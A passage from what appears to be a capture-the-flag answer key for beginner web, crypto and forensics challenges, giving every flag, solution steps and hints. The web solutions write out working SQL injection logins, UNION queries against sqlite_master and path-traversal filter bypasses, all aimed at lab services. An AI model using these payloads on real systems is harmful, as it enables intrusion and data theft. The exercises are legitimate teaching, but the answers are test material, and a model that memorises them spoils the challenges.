- (10 points) `ssh` can log in with a key file instead of a password: `ssh -i keyfile user@server`. You're already on the server, so the server is `localhost`.
- (10 points) Run `ssh -i ~/spare_key caretaker@localhost`, type `yes` if it asks, then `cat flag.txt`. Type `exit` twice to come back out.

**Common mistakes:** `ssh caretaker@localhost` without `-i`: it asks for a password nobody knows. Copying the key elsewhere: SSH refuses a key file others can read. Use it where it is.

## Web

### Web 1. View Source (★ Easy, 30)

**Teaches:** Page source and HTML comments.  
**Where:** `http://192.168.68.103:8301`  
**Flag:** `FLAG{v13w_s0urc3_r3v34ls_4ll}`

**Steps:**

1. **Ctrl+U**, **Ctrl+F** `<!--`: three comments, one with the flag.
   ```text
   ['<!-- TODO: the croissant price below is out of date. -->', '<!-- Staff note: delete this before the site goes live. Oven password: FLAG{v13w_s0urc3_r3v34ls_4ll} -->', '<!-- Photo of the shop goes here once we take one. -->']
   ```

**Hints** (what a team that bought them has been told):

- (5 points) You can also search the page source for `FLAG`. On a Mac, View page source is **Cmd+Option+U**.

**Common mistakes:** Using Inspect: extensions add their own code there.

### Web 2. Robots Only (★ Easy, 30)

**Teaches:** robots.txt.  
**Where:** `http://192.168.68.103:8302`  
**Flag:** `FLAG{r0b0ts_txt_p01nts_th3_w4y}`

**Steps:**

1. `/robots.txt`:
   ```text
   User-agent: *
   Disallow: /old-menu/
   Disallow: /staff-only/
   Disallow: /backup/
   Disallow: /test-page/
   ```
2. Only `/backup/` still has something:
   ```text
   Backup Backup Bean There Coffee Backup of the shop's secret recipe card. Robots aren't supposed to find this page, and neither are you. FLAG{r0b0ts_txt_p01nts_th3_w4y}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) The file is always called `robots.txt`. Add `/robots.txt` to the end of the website's address.
- (5 points) Each `Disallow:` line is a page. Add it to the website's address, for example `http://address:8302/old-menu/`, and try each one.

**Common mistakes:** Stopping after the first empty page.

### Web 3. Client-Side Lock (★ Easy, 30)

**Teaches:** Client-side checks can be read.  
**Where:** `http://192.168.68.103:8303`  
**Flag:** `FLAG{th3_br0ws3r_kn3w_th3_c0d3}`

**Steps:**

1. **Ctrl+U**: near the bottom,
   ```text
   const MEMBERS_CODE = "extra-cheese-please"
   ```
2. Type `extra-cheese-please` and press **Let me in**: the members' area shows the flag.

**Hints** (what a team that bought them has been told):

- (5 points) Press **Ctrl+U** to see the page's code. Near the bottom, between `<script>` and `</script>`, there's a line starting `const MEMBERS_CODE =`. The code is the text in quotes after it.

### Web 4. Greyed Out (★ Easy, 30)

**Teaches:** Disabled buttons are just HTML.  
**Where:** `http://192.168.68.103:8304`  
**Flag:** `FLAG{gr3y3d_0ut_but_n0t_l0ck3d}`

**Steps:**

1. Right-click the button > **Inspect**, delete `disabled`, click it.
   ```text
   Free Cookie FridaySunny Side Bakery
   
   Claim received. Enjoy your cookie! Show this code at the counter:
   
   FLAG{gr3y3d_0ut_but_n0t_l0ck3d}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Right-click the button and choose **Inspect**. The button's code is highlighted, and it contains the word `disabled`.
- (5 points) In the Elements panel, double-click `disabled` and delete it (or right-click the line, choose **Edit as HTML** and remove it), press Enter, then click the button on the page.

**Common mistakes:** Going to `/claim` directly (it needs the button's POST).

### Web 5. Saved for Later (★ Easy, 30)

**Teaches:** Local Storage.  
**Where:** `http://192.168.68.103:8305`  
**Flag:** `FLAG{l0c4l_st0r4g3_r3m3mb3rs}`

**Steps:**

1. F12 > **Application** > **Local Storage** > the address: `bonus_track`.
   ```text
   {"theme":"light","bonus_track":"FLAG{l0c4l_st0r4g3_r3m3mb3rs}","volume":"70"}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Press **F12**, then open **Application** (Chrome and Edge) or **Storage** (Firefox). Local Storage is in the list on the left. Open it, then click the website's address. The flag is next to `bonus_track`.

**Common mistakes:** Looking in Cookies instead.

### Web 6. Header Hunt (★ Easy, 30)

**Teaches:** Response headers.  
**Where:** `http://192.168.68.103:8306`  
**Flag:** `FLAG{h34d3rs_c4rry_s3cr3ts}`

**Steps:**

1. F12 > **Network**, refresh, first line > **Headers** > Response Headers: `X-Secret-Forecast`.
2. Or `curl.exe -i` followed by the address:
   ```text
   HTTP/1.1 200 OK
   Server: gunicorn
   Date: Mon, 23 Nov 2026 08:50:07 GMT
   Connection: close
   Content-Type: text/html; charset=utf-8
   Content-Length: 1969
   X-Secret-Forecast: FLAG{h34d3rs_c4rry_s3cr3ts}
   
   <!doctype html>
   <html lang="en">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Weather Today</title>
     <style>
       body { margin: 0; font-f
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Press **F12**, open the **Network** tab, then refresh the page (F5) with developer tools still open. Click the first line in the list, then **Headers**, and look under **Response Headers**. Or in PowerShell: `curl.exe -i` followed by the address.

**Common mistakes:** Looking at Request Headers.

### Web 7. Blink (★★ Medium, 60)

**Teaches:** Meta-refresh redirects; reading a page without following it.  
**Where:** `http://192.168.68.103:8307`  
**Flag:** `FLAG{r3d1r3ct_t00_f4st}`

**Steps:**

1. Type `view-source:http://192.168.68.103:8307` in the address bar (not Ctrl+U after landing on /moved).
2. Or `curl.exe http://192.168.68.103:8307`:
   ```text
   Lost and Found Lost and Found Town library Lost property this week: one umbrella, two left gloves, and a note that says: FLAG{r3d1r3ct_t00_f4st}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) If you type `view-source:` in front of an address in the address bar, the browser shows that page's code without running it, so nothing redirects you. Type the address yourself rather than pressing Ctrl+U.
- (5 points) Another way: in PowerShell, `curl.exe` followed by the address prints the page's code and doesn't follow this kind of redirect.

**Common mistakes:** Pressing Ctrl+U on `/moved`: wrong page.

### Web 8. Next Order (★★ Medium, 60)

**Teaches:** Guessable IDs (IDOR).  
**Where:** `http://192.168.68.103:8308`  
**Flag:** `FLAG{0rd3r_numb3rs_4r3_gu3ss4bl3}`

**Steps:**

1. Your orders are 1004, 1007, 1009.
   ```text
   ['/order/1004', '/order/1007', '/order/1009']
   ```
2. `/order/1001`:
   ```text
   Pizza Tracker Pizza Tracker Order 1001 Ordered by: The owner 1 x Owner's Special. Note to the kitchen: the safe code is FLAG{0rd3r_numb3rs_4r3_gu3ss4bl3} Back to your orders
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Click one of your orders and look at the address bar: it ends with the order's number. Change the number, press Enter, and you see someone else's order.
- (5 points) Order numbers start at 1001, and the very first order was the owner's. Go to `/order/1001`.

**Common mistakes:** Only trying numbers above 1009.

### Web 9. Cookie Jar (★★ Medium, 60)

**Teaches:** Editing a Base64 cookie.  
**Where:** `http://192.168.68.103:8309`  
**Flag:** `FLAG{c00k13s_c4n_b3_3d1t3d}`

**Steps:**

1. The `membership` cookie:
   ```text
   bGV2ZWw9YmFzaWM= -> level=basic
   ```
2. Replace it with `bGV2ZWw9Z29sZA==` (`level=gold`) and refresh: the sauna shows the flag (checked in Edge).

**Hints** (what a team that bought them has been told):

- (5 points) The cookie's value is Base64. Decode it with [CyberChef](https://gchq.github.io/CyberChef/)'s **From Base64** to read it: it says `level=basic`.
- (10 points) Put `level=gold` through CyberChef's **To Base64**, which gives `bGV2ZWw9Z29sZA==`. Double-click the cookie's value in developer tools, paste that in, press Enter, and refresh the page.

**Common mistakes:** Typing `gold` straight in, unencoded.

### Web 10. Secret Agent (★★ Medium, 60)

**Teaches:** The User-Agent header.  
**Where:** `http://192.168.68.103:8310`  
**Flag:** `FLAG{y0u_4r3_wh0_y0u_s4y_y0u_4r3}`

**Steps:**

1. DevTools ⋮ > **More tools** > **Network conditions**, untick **Use browser default**, type `SecretAgent/007`, refresh with DevTools open (checked in Edge).
2. Or `curl.exe -A "SecretAgent/007"` followed by the address:
   ```text
   Spy Gadget Shop Spy Gadget Shop Agents only Your browser introduced itself as: SecretAgent/007 Welcome back, agent. The gadget catalogue is open. FLAG{y0u_4r3_wh0_y0u_s4y_y0u_4r3}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In Chrome or Edge, open developer tools, then the ⋮ menu > **More tools** > **Network conditions**. Untick **Use browser default** under User agent, type `SecretAgent/007`, and refresh with developer tools still open.
- (10 points) Or in PowerShell: `curl.exe -A "SecretAgent/007"` followed by the address. Type `curl.exe`, not `curl`.

**Common mistakes:** `curl` instead of `curl.exe` in PowerShell (that's a different command).

### Web 11. Up a Folder (★★ Medium, 60)

**Teaches:** Path traversal.  
**Where:** `http://192.168.68.103:8311`  
**Flag:** `FLAG{cl1mb3d_0n3_f0ld3r_up}`

**Steps:**

1. `?recipe=nothing.txt` shows the path:
   ```text
   Recipe Box Recipe Box Breakfast ideas Pancakes · Omelette · Smoothie Couldn't open the file /tmp/recipe-box/recipes/nothing.txt
   ```
2. `?recipe=../flag.txt`:
   ```text
   Recipe Box Recipe Box Breakfast ideas Pancakes · Omelette · Smoothie Grandma's secret ingredient: FLAG{cl1mb3d_0n3_f0ld3r_up}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Ask for a recipe that doesn't exist, like `?recipe=nothing.txt`. The error shows the full path the site tried to open.
- (10 points) In a path, `..` means the folder above, just like `cd ..` on Linux. Try `?recipe=../flag.txt`.

### Web 12. Sign In Anyway (★★ Medium, 60)

**Teaches:** SQL injection login bypass, choosing the account.  
**Where:** `http://192.168.68.103:8312`  
**Flag:** `FLAG{s1gn3d_1n_w1th0ut_4_p4ssw0rd}`

**Steps:**

1. Username `'`:
   ```text
   Starlight Cinema Starlight Cinema Staff portal Username Password Sign in Database error: near "anything": syntax error
   ```
2. Username `' OR 1=1 -- `: signs in as guest.
   ```text
   Starlight Cinema Starlight Cinema Staff portal Signed in as guest (Visitor). Only the manager account can see the safe code. Sign out
   ```
3. Username `manager' -- `, any password:
   ```text
   Starlight Cinema Starlight Cinema Staff portal Signed in as manager (Cinema Manager). The safe code for tonight: FLAG{s1gn3d_1n_w1th0ut_4_p4ssw0rd} Sign out
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Put a single quote `'` in the username and look at the error: your quote broke the query. Then try `' OR 1=1 -- ` (with a space at the end) as the username, with any password.
- (10 points) `' OR 1=1 -- ` signs you in as whichever account comes first, which isn't the manager. To pick the account, give its name and then cut the password check off: type `manager' -- ` (with a space at the end) as the username, and anything as the password.

**Common mistakes:** Forgetting the space after `--`. Putting the injection in the password box (works too, but then they need `' OR username='manager' -- `).

### Web 13. Badge Swap (★★★ Hard, 100)

**Teaches:** Editing JSON inside a Base64 cookie: two fields.  
**Where:** `http://192.168.68.103:8313`  
**Flag:** `FLAG{tw0_f13lds_sw4pp3d}`

**Steps:**

1. The `ticket` cookie decodes to JSON:
   ```text
   eyJuYW1lIjogImd1ZXN0IiwgInNlYXQiOiAic3RhbmRpbmciLCAiYmFja3N0YWdlIjogZmFsc2V9 -> {"name": "guest", "seat": "standing", "backstage": false}
   ```
2. Changing only the seat isn't enough: the page shows seat vip but backstage false.
3. `{"name": "guest", "seat": "vip", "backstage": true}` through **To Base64**, pasted as the cookie:
   ```text
   Summer Beats Festival Summer Beats Festival Your ticket Ticket holder: guest Seat: vip · Backstage: true Welcome backstage! The band left you a note: FLAG{tw0_f13lds_sw4pp3d}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) The value is Base64. [CyberChef](https://gchq.github.io/CyberChef/)'s **From Base64** shows JSON: names and values in quotes, inside curly brackets. Change `standing` to `vip` and `false` to `true`, keeping every quote and bracket, then use **To Base64** and paste the result in as the cookie's value.
- (20 points) The JSON to encode is `{"name": "guest", "seat": "vip", "backstage": true}`. **To Base64** turns it into `eyJuYW1lIjogImd1ZXN0IiwgInNlYXQiOiAidmlwIiwgImJhY2tzdGFnZSI6IHRydWV9`. Paste that as the cookie's value, press Enter, and refresh the page.

**Common mistakes:** Breaking the JSON (a missing quote): the page says the cookie couldn't be read.

### Web 14. The Union (★★★ Hard, 100)

**Teaches:** UNION-based SQL injection and sqlite_master.  
**Where:** `http://192.168.68.103:8314`  
**Flag:** `FLAG{un10n_s3l3ct_f0und_th3_st4sh}`

**Steps:**

1. `' UNION SELECT 1, 2, 3 -- `: a row of numbers.
   ```text
   [['1', '2', '3'], ['Dancing in the Kitchen', 'Extra Cheese', '2023'], ['Homework Can Wait', 'The Procrastinators', '2020']]
   ```
2. `' UNION SELECT name, sql, 3 FROM sqlite_master -- `:
   ```text
   [['Dancing in the Kitchen', 'Extra Cheese', '2023'], ['Homework Can Wait', 'The Procrastinators', '2020'], ['Karaoke Night', 'Night Owls', '2024'], ['Last Bus Home', 'Night Owls', '2018'], ['Lost My Keys', 'Forgetful Five', '2017'], ['Morning Coffee', 'The Early Birds', '2019'], ['Pizza Party', 'Extra Cheese', '2021'], ['Rainy Day Blues', 'Grey Skies', '2015'], ['Sunday Pancakes', 'The Early Birds', '2022'], ['Window Seat', 'Grey Skies', '2016'], ['secret_stash_4d2b', 'CREATE TABLE secret_stash_4d2b (item TEXT, value TEXT)', '3'], ['songs', 'CREATE TABLE songs (title TEXT, artist TEXT, year INTEGER)', '3']]
   ```
3. `' UNION SELECT item, value, 3 FROM secret_stash_4d2b -- `:
   ```text
   [['Dancing in the Kitchen', 'Extra Cheese', '2023'], ['Homework Can Wait', 'The Procrastinators', '2020'], ['Karaoke Night', 'Night Owls', '2024'], ['Last Bus Home', 'Night Owls', '2018'], ['Lost My Keys', 'Forgetful Five', '2017'], ['Morning Coffee', 'The Early Birds', '2019'], ['Pizza Party', 'Extra Cheese', '2021'], ['Rainy Day Blues', 'Grey Skies', '2015'], ['Sunday Pancakes', 'The Early Birds', '2022'], ['Window Seat', 'Grey Skies', '2016'], ['lunch_order', 'two noodles, one rice', '3'], ['vault_code', 'FLAG{un10n_s3l3ct_f0und_th3_st4sh}', '3'], ['wifi_password', 'ask at the counter', '3']]
   ```

**Hints** (what a team that bought them has been told):

- (10 points) Count the columns in the results: there are 3. Search for `' UNION SELECT 1, 2, 3 -- ` (with a space at the end). The numbers appear as a row, which shows the injection works. SQLite lists its tables in one called `sqlite_master`.
- (20 points) Search `' UNION SELECT name, sql, 3 FROM sqlite_master -- ` to see every table's name and columns. Then search `' UNION SELECT item, value, 3 FROM ` followed by the hidden table's name and ` -- `.

**Common mistakes:** Selecting 2 or 4 columns ("SELECTs to the left and right of UNION do not have the same number of result columns").

### Web 15. Filter Dodge (★★★ Hard, 100)

**Teaches:** Beating a filter that only runs once.  
**Where:** `http://192.168.68.103:8315`  
**Flag:** `FLAG{f1lt3r_d0dg3d_w1th_d0ts}`

**Steps:**

1. `?page=../flag.txt`: the filter removes `../`.
   ```text
   Travel Diary Travel Diary Summer holiday Day 1 · Day 2 · Day 3 You asked for: ../flag.txt After the safety filter: flag.txt Couldn't open the file /tmp/travel-diary/pages/flag.txt
   ```
2. `?page=....//flag.txt`: what's left is `../flag.txt`.
   ```text
   Travel Diary Travel Diary Summer holiday Day 1 · Day 2 · Day 3 You asked for: ....//flag.txt After the safety filter: ../flag.txt Souvenir code: FLAG{f1lt3r_d0dg3d_w1th_d0ts}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) Try `?page=../flag.txt` and look at "After the safety filter": the `../` is gone. The filter doesn't check again after deleting, so think about a name that *turns into* `../` once a `../` is cut out of the middle of it.
- (20 points) Use `?page=....//flag.txt`. The filter cuts the `../` out of the middle of `....//`, and what's left is `../`.

**Common mistakes:** `..././flag.txt`-style guesses that don't leave `../` behind; watch the "After the safety filter" line.

## Crypto

### Crypto 1. Not So Secret (★ Easy, 30)

**Teaches:** Base64 in CyberChef.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{b4s3_64_1s_n0t_s3cr3t}`

**Steps:**

1. **From Base64**.
   ```text
   Hi there! If you can read this, you just decoded your first Base64. Here is your flag: FLAG{b4s3_64_1s_n0t_s3cr3t}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Output still scrambled? Check the Recipe says **From** Base64, not **To** Base64, and that you pasted all of `message.txt`.

**Common mistakes:** Using **To Base64**. Copying only part of the file.

### Crypto 2. Thirty-Two (★ Easy, 30)

**Teaches:** Base32 (capitals and 2-7).  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{h4lf_th3_symb0ls_b4s3_32}`

**Steps:**

1. **From Base32**.
   ```text
   Not Base64 this time, but close. Here is your flag: FLAG{h4lf_th3_symb0ls_b4s3_32}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Half of 64 is 32. CyberChef has an operation with that name.

**Common mistakes:** Trying From Base64 (gives garbage).

### Crypto 3. Hex Marks the Spot (★ Easy, 30)

**Teaches:** Hexadecimal.  
**Where:** `map.txt` (download)  
**Flag:** `FLAG{h3x_m4rks_th3_sp0t}`

**Steps:**

1. **From Hex**.
   ```text
   Ahoy! The treasure map says: FLAG{h3x_m4rks_th3_sp0t}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In CyberChef, use the **From Hex** operation.

### Crypto 4. Ones and Zeros (★ Easy, 30)

**Teaches:** Binary, 8 bits a character.  
**Where:** `signal.txt` (download)  
**Flag:** `FLAG{0n3s_4nd_z3r0s}`

**Steps:**

1. **From Binary** (defaults).
   ```text
   Beep. Computer says: FLAG{0n3s_4nd_z3r0s}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In CyberChef, drag the **From Binary** operation into the Recipe column, and paste the file's contents into Input.

### Crypto 5. Beep Boop (★ Easy, 30)

**Teaches:** Morse code, then writing the flag from words.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{DOTS_AND_DASHES}` (any capitals)

**Steps:**

1. **From Morse Code** (defaults).
   ```text
   HELLO FROM THE RADIO ROOM FLAG WORDS FOLLOW DOTS AND DASHES 
   ```
2. The words after `FLAG WORDS FOLLOW` are DOTS AND DASHES: submit `FLAG{DOTS_AND_DASHES}` (any capitals).

**Hints** (what a team that bought them has been told):

- (5 points) It's **Morse code**. CyberChef's **From Morse Code** reads this file as it is.

**Common mistakes:** Submitting the words without `FLAG{}` and underscores.

### Crypto 6. Easy as ABC (★ Easy, 30)

**Teaches:** A1Z26: letters as their place in the alphabet.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{NUMBERS_TO_LETTERS}` (any capitals)

**Steps:**

1. dcode's Letter Number Code, **DECRYPT**: the whole file at once, words run together.
   ```text
   Showing most likely results
   [A1Z26]	THISONEISEASYASABCFLAGWORDSFOLLOWNUMBERSTOLETTERS
   [A0B1Z25]	UIJTPOFJTFBTZBTBCDGMBHXPSETGPMMPXOVNCFSTUPMFUUFST
   ```
2. Or CyberChef's **A1Z26 Cipher Decode**, one line at a time (the whole file at once drops letters):
   ```text
   this one is easy as abc flag words follow numbers to letters
   ```
3. Submit `FLAG{NUMBERS_TO_LETTERS}`.

**Hints** (what a team that bought them has been told):

- (5 points) Each number is a letter's place in the alphabet: 1 is A, 2 is B, and so on. The code is called **A1Z26**. dcode's [Letter Number Code](https://www.dcode.fr/letter-number-cipher) tool decodes the whole file at once (press **DECRYPT**), but runs the words together, so split them yourself. CyberChef's **A1Z26 Cipher Decode** only works one line (one word) at a time.

**Common mistakes:** Pasting the whole file into CyberChef's A1Z26 at once: letters go missing.

### Crypto 7. Mirror, Mirror (★★ Medium, 60)

**Teaches:** Two layers: Base64, then Atbash.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{m1rr0r_m1rr0r_0n_th3_w4ll}`

**Steps:**

1. **From Base64** alone gives a flipped alphabet (`UOZT{`).
   ```text
   Nriili, nriili, lm gsv dzoo, dsl szh gsv uozt zugvi zoo? Blf wl: UOZT{n1ii0i_n1ii0i_0m_gs3_d4oo}
   ```
2. Add **Atbash Cipher**.
   ```text
   Mirror, mirror, on the wall, who has the flag after all? You do: FLAG{m1rr0r_m1rr0r_0n_th3_w4ll}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) After **From Base64**, the flag's start reads `UOZT{`: U is the 6th letter from the end of the alphabet, and F is the 6th from the start. The flipped-alphabet cipher is called **Atbash**.
- (5 points) Recipe: **From Base64**, then **Atbash Cipher**.

**Common mistakes:** Atbash before Base64.

### Crypto 8. Shift Work (★★ Medium, 60)

**Teaches:** Hex, then a Caesar shift found by brute force.  
**Where:** `report.txt` (download)  
**Flag:** `FLAG{sh1ft_w0rk_cl0ck3d_0ut}`

**Steps:**

1. **From Hex**, then **ROT13 Brute Force** with crib `FLAG`: one line, amount 9.
   ```text
   Amount =  9: Night shift report. All quiet. Flag follows: FLAG{sh1ft_w0rk_cl0ck3d_0ut}
   ```
2. Or **ROT13** with Amount `9`.
   ```text
   Night shift report. All quiet. Flag follows: FLAG{sh1ft_w0rk_cl0ck3d_0ut}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Start with **From Hex**. Below it, add **ROT13 Brute Force**, which shows the message at every shift. Type `FLAG` in its **Crib** box to keep only the line that reads. (**Caesar Box Cipher** is a different thing.)
- (10 points) The shift was 17, so moving 9 more places brings every letter back (17 + 9 = 26). Recipe: **From Hex**, then **ROT13** with **Amount** set to `9`.

**Common mistakes:** Using **Caesar Box Cipher** (a different cipher).

### Crypto 9. Family Name (★★ Medium, 60)

**Teaches:** Vigenère with a known keyword, and the crib trick.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{f4m1ly_n4m3_unl0cks_1t}`

**Steps:**

1. The four letters before `{` are `XTMV`. **Vigenère Decode** with key `FLAG` on just those gives the keyword's start.
   ```text
   SIMP
   ```
2. The Simpsons: **Vigenère Decode** with `SIMPSON`.
   ```text
   Mmm, donuts. The whole family says hello from Evergreen Terrace. Flag follows: FLAG{f4m1ly_n4m3_unl0cks_1t}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Not sure of the family? Work the keyword out instead. The cipher only changes letters, so the `{` is still there, and the four letters right before it decrypt to `FLAG`. Put just those four letters through **Vigenère Decode** with `FLAG` as the key, and the output is the start of the keyword.
- (5 points) The keyword is `SIMPSON`.

**Common mistakes:** Using `SIMPSONS` (8 letters). Using just `SIMP`.

### Crypto 10. Repeat After Me (★★ Medium, 60)

**Teaches:** Repeating-key XOR, and recovering the key from a known start.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{t4c0_tu3sd4y_x0r}`

**Steps:**

1. **From Hex**, **XOR** with key `FLAG{` (format UTF8): the output starts with the key.
   ```text
   TACOTs;m#eqv&u\=a_|`p"[Jb/w|O%mp~L)LuaGvl{&
   ```
2. **XOR** with key `TACO`, format **UTF8**.
   ```text
   FLAG{t4c0_tu3sd4y_x0r} See you next Tuesday.
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Not sure of the food? Work the key out instead. The message opens with the flag, so XOR the decoded hex with `FLAG{` (format UTF8). The first characters of the output spell the key, which then starts to repeat.
- (5 points) The key is `TACO`. Recipe: **From Hex**, then **XOR** with key `TACO` and format **UTF8**.

**Common mistakes:** Leaving the key format on Hex (gives garbage).

### Crypto 11. Letter Swap (★★ Medium, 60)

**Teaches:** Substitution ciphers and frequency analysis.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{LETTERS_IN_DISGUISE}` (any capitals)

**Steps:**

1. quipqiup: paste, **Solve**. The top line is the answer.
   ```text
   TUTION CIPHER EVERY LETTER IS ALWAYS REPLACED BY THE SAME OTHER LETTER, SO THE MOST COMMON LETTERS IN THE MESSAGE STAND FOR THE MOST COMMON LETTERS IN ENGLISH. 
   ```
2. Submit `FLAG{LETTERS_IN_DISGUISE}` (any capitals).

**Hints** (what a team that bought them has been told):

- (5 points) Paste the whole message into [quipqiup](https://quipqiup.com/) and press **Solve**. The top answer is usually the right one.
- (10 points) By hand: the flag starts `FLAG{`, so the four letters before the `{` give you F, L, A and G for free. The most common letter in English is E, then T and A. CyberChef's **Substitute** swaps letters for you.

**Common mistakes:** Expecting a key: there isn't one to type.

### Crypto 12. Common Password (★★ Medium, 60)

**Teaches:** Hash lookups for common passwords.  
**Where:** `leaked.txt` (download)  
**Flag:** `FLAG{sunshine}` (any capitals)

**Steps:**

1. `leaked.txt` has the MD5 hash `0571749e2ac330a7455809c6b0e7af90`. CrackStation (tick the robot box, **Crack Hashes**) gives `sunshine`.
2. Check in CyberChef: **MD5** of `sunshine`.
   ```text
   0571749e2ac330a7455809c6b0e7af90
   ```
3. Submit `FLAG{sunshine}`.

**Hints** (what a team that bought them has been told):

- (5 points) Paste the hash into [CrackStation](https://crackstation.net/), tick the box to show you're not a robot, and press **Crack Hashes**.
- (5 points) It's one of the most common passwords in the world: one word, the thing you hope for on a beach day. To check a guess, CyberChef's **MD5** turns any word into its hash. If it matches the one in `leaked.txt`, that's the password.

**Common mistakes:** Trying to "decrypt" MD5 in CyberChef: hashes can't be reversed, only looked up.

### Crypto 13. Shared Secret (★★★ Hard, 100)

**Teaches:** RSA with a shared prime: GCD, then decrypt.  
**Where:** `keys.txt` (download)  
**Flag:** `FLAG{sh4r3d_pr1m3_br0k3_b0th}`

**Steps:**

1. Alpertron: `Gcd(n_ana, n_ben)` with the real numbers, **Only evaluate**: a 309-digit prime (shown in groups of 6 digits).
   ```text
   136 356746 432882 274343 286245 192380 773544 173972 610399 651507 068758 372658 720618 191680 027173 013623 004843 608330 232137 588726 312343 382698 553404 21 ...
   ```
2. Pasting that number back into Alpertron gives:
   ```text
   Syntax error
   ```
3. So do the division in one go: `n_ben / Gcd(n_ana, n_ben)`.
   ```text
   163 595789 605701 788819 553783 773694 330286 070696 455472 659468 307073 994269 434389 772298 720365 935056 207738 6485 ...
   ```
4. dcode RSA Cipher: C, E, N (Ben's), P and Q (spaces are fine), **Plaintext as Character string**, **CALCULATE/DECRYPT**.
   ```text
   ✔ D computed with P,Q,E
   ✔ Decryption using C,D,N
   Hi Ben, it's Ana. Don't tell anyone: FLAG{sh4r3d_pr1m3_br0k3_b0th}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) If two numbers have a factor in common, you don't need to split either one to find it. Their greatest common divisor (GCD) gives it to you instantly, even for numbers this big. On [Alpertron's calculator](https://www.alpertron.com.ar/ECM.HTM), type `Gcd(first number, second number)` and press **Only evaluate**.
- (20 points) The other prime `q` is Ben's `n` divided by `p`. Alpertron prints long numbers with spaces in them and can't read them back, so do it in one go: type `n_ben / Gcd(n_ana, n_ben)` with the real numbers and press **Only evaluate**. Then [dcode's RSA Cipher tool](https://www.dcode.fr/rsa-cipher) decrypts for you: fill in `C`, `E`, `N` (Ben's), `P` and `Q` (the spaces are fine there), choose **Plaintext as Character string**, and press **CALCULATE/DECRYPT**.

**Common mistakes:** Using `n_ana` as N in dcode (the message was for Ben). Pasting Alpertron's spaced numbers back into Alpertron.

### Crypto 14. No Key Given (★★★ Hard, 100)

**Teaches:** Breaking Vigenère without the key.  
**Where:** `message.txt` (download)  
**Flag:** `FLAG{th3_k3y_f0und_1ts3lf}`

**Steps:**

1. dcode Vigenère: paste into **Vigenere ciphertext**, press **AUTOMATIC DECRYPTION**. The top result shows the key BRUNCH.
   ```text
   [🔑|result·s]
   Warning Showing most likely results
   
   ABCDEFGHIJKLMNOPQRSTUVWXYZ (26)
   ↑↓	↑↓
   BRUNCH	Breakfast is often called the most important meal of the day,
   although nobody seems to agree on who first said it. Around the
   world, people start their mornings in v
   ```
2. Or CyberChef **Vigenère Decode** with `BRUNCH`; the flag is at the end.
   ```text
   ou need for
   a long day of puzzles. The flag follows:
   FLAG{th3_k3y_f0und_1ts3lf}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) Use [dcode's Vigenère Cipher tool](https://www.dcode.fr/vigenere-cipher). Paste the whole message into the **Vigenere ciphertext** box and press **AUTOMATIC DECRYPTION**. The results appear on the left, best first: each line shows a keyword and the message it gives.
- (20 points) The keyword is `BRUNCH`. In CyberChef, **Vigenère Decode** with that key shows the whole message.

**Common mistakes:** Pressing the plain **DECRYPT** button, which needs a key.

### Crypto 15. Onion (★★★ Hard, 100)

**Teaches:** Four layers, two of them brute-forced.  
**Where:** `onion.txt` (download)  
**Flag:** `FLAG{p33l3d_3v3ry_l4y3r}`

**Steps:**

1. **From Hex**, **XOR Brute Force** with crib `==`: one key is left, `5a`.
   ```text
   Key = 5a: RXVhIHNnamsgb3ogenUgem5rIHNvampyayB1bCB6bmsgdXRvdXQhIExyZ206IExSR017djMzcjNqXzNiM3hlX3I0ZTN4fQ==
   ```
2. **XOR** with key `5a`, format **Hex**, then **From Base64**: the Caesar layer.
   ```text
   Eua sgjk oz zu znk sojjrk ul znk utout! Lrgm: LRGM{v33r3j_3b3xe_r4e3x}
   ```
3. **ROT13 Brute Force** with crib `FLAG`: amount 20.
   ```text
   Amount = 20: You made it to the middle of the onion! Flag: FLAG{p33l3d_3v3ry_l4y3r}
   ```
4. Whole recipe with **ROT13** Amount `20`.
   ```text
   You made it to the middle of the onion! Flag: FLAG{p33l3d_3v3ry_l4y3r}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) After **From Hex**, add **XOR Brute Force**. The right key turns the bytes into Base64, which ends in `==`, so type `==` in its **Crib** box: only one key is left, and the line starts with it. Do the same for the Caesar layer later with **ROT13 Brute Force** and the crib `FLAG`.
- (20 points) Recipe: **From Hex**, then **XOR** with key `5a` and format **Hex**, then **From Base64**, then **ROT13** with **Amount** set to `20`.

**Common mistakes:** Typing `5a` into XOR with format UTF8. Looking for readable text in XOR Brute Force: the right line is Base64, not English.

## Forensics

### Forensics 1. Photo Notes (★ Easy, 30)

**Teaches:** PNG metadata (text chunks), read in a text editor.  
**Where:** `beach_day.png` (download)  
**Flag:** `FLAG{ph0t0s_c4n_h0ld_n0t3s}`

**Steps:**

1. Drag `beach_day.png` into Notepad, **Ctrl+F** `FLAG`.
   ```text
   Note to self: best beach day ever. FLAG{ph0t0s_c4n_h0ld_n0t3s}
   ```

**Hints** (what a team that bought them has been told):

